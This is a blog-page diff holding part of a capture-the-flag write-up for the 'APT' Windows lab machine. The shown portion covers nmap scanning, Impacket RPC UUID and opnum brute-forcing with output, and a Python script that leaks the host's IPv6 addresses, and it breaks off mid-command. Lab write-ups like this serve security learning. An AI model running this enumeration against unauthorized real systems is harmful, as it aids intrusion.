@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="APT is an insane difficulty Windows machine where RPC and HTTP services are only exposed. Enumeration of existing RPC interfaces provides an interesting object that can be used to disclose the IPv6 ad">
+<meta property="og:type" content="article">
+<meta property="og:title" content="APT - AttckForWork">
+<meta property="og:url" content="https://www.hack0day.net/2022/07/30/APT-AttckForWork/index.html">
+<meta property="og:site_name" content="Attck For Work">
+<meta property="og:description" content="APT is an insane difficulty Windows machine where RPC and HTTP services are only exposed. Enumeration of existing RPC interfaces provides an interesting object that can be used to disclose the IPv6 ad">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-30T07:26:05.000Z">
+<meta property="article:modified_time" content="2022-07-30T07:29:15.110Z">
+<meta property="article:author" content="Attck">
+<meta property="article:tag" content="Pentesting Domain">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>APT - AttckForWork</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Attck For Work" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Attckforwork/">Github</a></li><!--
+     --><!--
+       --><li><a href="/atom.xml">Rss</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.hack0day.net/2022/07/30/APT-AttckForWork/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&text=APT - AttckForWork"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&is_video=false&description=APT - AttckForWork"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=APT - AttckForWork&body=Check out this article: https://www.hack0day.net/2022/07/30/APT-AttckForWork/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&name=APT - AttckForWork&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&t=APT - AttckForWork"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#KnowLedGePoint"><span class="toc-number">1.</span> <span class="toc-text">KnowLedGePoint</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IP-PORT-SCAN"><span class="toc-number"></span> <span class="toc-text">IP PORT SCAN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number"></span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impacket"><span class="toc-number"></span> <span class="toc-text">Impacket</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RPCMAP"><span class="toc-number"></span> <span class="toc-text">RPCMAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example"><span class="toc-number"></span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UUID-MAP"><span class="toc-number"></span> <span class="toc-text">UUID MAP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UUID-IObjectExporter"><span class="toc-number"></span> <span class="toc-text">UUID IObjectExporter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number"></span> <span class="toc-text">Nmap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#impacket-smbclient"><span class="toc-number"></span> <span class="toc-text">impacket smbclient</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unzip"><span class="toc-number"></span> <span class="toc-text">unzip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zip2john"><span class="toc-number"></span> <span class="toc-text">zip2john</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fcrackzip"><span class="toc-number"></span> <span class="toc-text">Fcrackzip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hash-extract"><span class="toc-number"></span> <span class="toc-text">Hash extract</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crackmapexec"><span class="toc-number"></span> <span class="toc-text">crackmapexec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PyKerbrute"><span class="toc-number"></span> <span class="toc-text">PyKerbrute</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reg"><span class="toc-number"></span> <span class="toc-text">Reg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Evil-winrm"><span class="toc-number"></span> <span class="toc-text">Evil-winrm</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Responder-And-MpCmdRun"><span class="toc-number"></span> <span class="toc-text">Responder And MpCmdRun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hashdump"><span class="toc-number"></span> <span class="toc-text">Hashdump</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        APT - AttckForWork
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Attck</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-30T07:26:05.000Z" itemprop="datePublished">2022-07-30</time>
+        
+        (Updated: <time datetime="2022-07-30T07:29:15.110Z" itemprop="dateModified">2022-07-30</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Pentesting-Domain/" rel="tag">Pentesting Domain</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>APT is an insane difficulty Windows machine where RPC and HTTP services are only exposed. Enumeration of existing RPC interfaces provides an interesting object that can be used to disclose the IPv6 address. The box is found to be protected by a firewall exemption that over IPv6 can give access to a backup share. User enumeration and bruteforce attacks can give us access to the registry which contains login credentials. The machine is configured to allow authentication via the NTLMv1 protocol, which is then can be leveraged to gain system access.</p>
+<h4 id="KnowLedGePoint"><a href="#KnowLedGePoint" class="headerlink" title="KnowLedGePoint"></a>KnowLedGePoint</h4><ul>
+<li>RPC enumeration</li>
+<li>Port Forwarding</li>
+<li>Remote Registry</li>
+<li>Exploiting NTLMv1</li>
+<li>Hashdump</li>
+</ul>
+<hr>
+<h1 id="IP-PORT-SCAN"><a href="#IP-PORT-SCAN" class="headerlink" title="IP PORT SCAN"></a>IP PORT SCAN</h1><p>Usually we will use nmap to scan the port information of ip：)</p>
+<h2 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h2><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -sV -T5 10.129.96.60</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 13:54 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.96.60</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">80/tcp  open  http    Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.72 seconds</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h1><p>Port 135 may have a lot of sensitive information leaked</p>
+<h2 id="RPCMAP"><a href="#RPCMAP" class="headerlink" title="RPCMAP"></a>RPCMAP</h2><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/impacket-0.10.0]</span><br><span class="line">└─$ rpcmap.py <span class="string">&#x27;ncacn_ip_tcp:10.129.96.60&#x27;</span></span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 00000136-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 000001A0-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-RPCE]: Remote Management Interface</span><br><span class="line">Provider: rpcrt4.dll</span><br><span class="line">UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0</span><br></pre></td></tr></table></figure></div>
+
+<p>Brute uuids view successful</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop/impacket-0.10.0]</span><br><span class="line">└─$ rpcmap.py <span class="string">&#x27;ncacn_ip_tcp:10.129.96.60&#x27;</span> -brute-opnums -brute-uuids -auth-level 1 -opnum-max 5 </span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 00000136-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 000001A0-0000-0000-C000-000000000046 v0.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</span><br><span class="line">Opnum 0: rpc_x_bad_stub_data</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: rpc_x_bad_stub_data</span><br><span class="line">Opnum 3: success</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: success</span><br><span class="line"></span><br><span class="line">Protocol: [MS-RPCE]: Remote Management Interface</span><br><span class="line">Provider: rpcrt4.dll</span><br><span class="line">UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0</span><br><span class="line">Opnum 0: success</span><br><span class="line">Opnum 1: rpc_x_bad_stub_data</span><br><span class="line">Opnum 2: success</span><br><span class="line">Opnum 3: success</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: nca_s_op_rng_error (opnum not found)</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0</span><br><span class="line">Opnum 0: rpc_fault_cant_perform</span><br><span class="line">Opnum 1: rpc_fault_cant_perform</span><br><span class="line">Opnum 2: rpc_x_bad_stub_data</span><br><span class="line">Opnum 3: rpc_x_bad_stub_data</span><br><span class="line">Opnum 4: rpc_x_bad_stub_data</span><br><span class="line">Opnum 5: rpc_fault_cant_perform</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0</span><br><span class="line">Opnums 0-5: rpc_s_access_denied</span><br><span class="line"></span><br><span class="line">[*] Tested 354 UUID(s)</span><br></pre></td></tr></table></figure></div>
+
+<p>We take the uuid to Microsoft’s official website to query.</p>
+<p>![[Pasted image 20220730134335.png]]</p>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Source: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">[MS-DCOM]: Standards Assignments | Microsoft Docs</a></p>
+<h1 id="UUID-MAP"><a href="#UUID-MAP" class="headerlink" title="UUID MAP"></a>UUID MAP</h1><h2 id="UUID-IObjectExporter"><a href="#UUID-IObjectExporter" class="headerlink" title="UUID IObjectExporter"></a>UUID IObjectExporter</h2><p>Use impacket to IObjectExporter</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> transport  </span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.rpcrt <span class="keyword">import</span> RPC_C_AUTHN_LEVEL_NONE  </span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dcomrt <span class="keyword">import</span> IObjectExporter  </span><br><span class="line">target = <span class="string">&#x27;ncacn_ip_tcp:10.129.96.60&#x27;</span>  </span><br><span class="line">rpcTransport = transport.DCERPCTransportFactory(target)  </span><br><span class="line">portmap = rpcTransport.get_dce_rpc()  </span><br><span class="line">portmap.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)  </span><br><span class="line">portmap.connect()  </span><br><span class="line">obj = IObjectExporter(portmap)  </span><br><span class="line">bindings = obj.ServerAlive2()  </span><br><span class="line"><span class="keyword">for</span> binding <span class="keyword">in</span> bindings:  </span><br><span class="line">	addr = binding[<span class="string">&#x27;aNetworkAddr&#x27;</span>]  </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;Address: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ python3 IOXIDResolver.py</span><br><span class="line">[*] Retrieving network interface of 10.129.96.60</span><br><span class="line">Address: apt</span><br><span class="line">Address: 10.129.96.60</span><br><span class="line">Address: dead:beef::1e2</span><br><span class="line">Address: dead:beef::b885:d62a:d679:573f</span><br><span class="line">Address: dead:beef::cc77:78ec:77c7:a7ff</span><br></pre></td></tr></table></figure></div>
+
+<p>Great, we got the <code>ipv6</code> address of the host</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&#x27;dead:beef::b885:d62a:d679:573f apt&#x27;</span> | <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span 